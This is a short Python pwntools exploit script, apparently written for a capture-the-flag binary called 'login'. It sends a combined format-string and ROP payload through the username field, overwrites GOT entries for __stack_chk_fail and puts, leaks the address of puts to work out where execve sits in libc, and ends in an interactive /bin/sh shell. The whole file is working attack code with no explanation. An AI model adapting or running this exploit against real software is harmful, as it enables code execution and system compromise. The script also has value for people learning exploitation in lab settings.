from pwn import *
import time

# login address
puts = 0x0804a01c
__stack_chk_fail = 0x0804a014
read_buff = 0x0804862b
inject = puts
leak = puts
call_inject = 0x080484c0

# libc address
execve_libc = 0x000b0670
puts_libc = 0x0005fca0

p_p_p_ret = 0x08048919
p_p_ret = 0x0804891a
terminal_char = 'B' 

# exploit starts

# input username
r = process('./login')
username = ''
username += p32(__stack_chk_fail)+p32(leak)
# padding to return address
username += 'A'*(0x50-len(username))
rop = flat(read_buff, p_p_p_ret, inject, 0x11111111, 0x11111142,
        call_inject, 0x22222222, inject+0xc, inject+0x4, inject+0x8)
count = 0x76-0x4c-len(rop)
padding = 'A'*count
username += rop+padding
username += '%s%191s%10$hhn%11$.4s\n'

r.recv(1000)
r.send(username)
time.sleep(0.5)
r.recv(1000)


# input password
r.send('\n')
time.sleep(0.5)
ret = r.recv(1000)
print [ret[352:356]]
puts_true = u32(ret[352:356])
print hex(puts_true)
execve_true = puts_true + execve_libc - puts_libc
inp = flat(execve_true, inject+0xc, 0x0, '/bin', '/sh'+terminal_char)
r.send(inp)
r.interactive()
r.close()

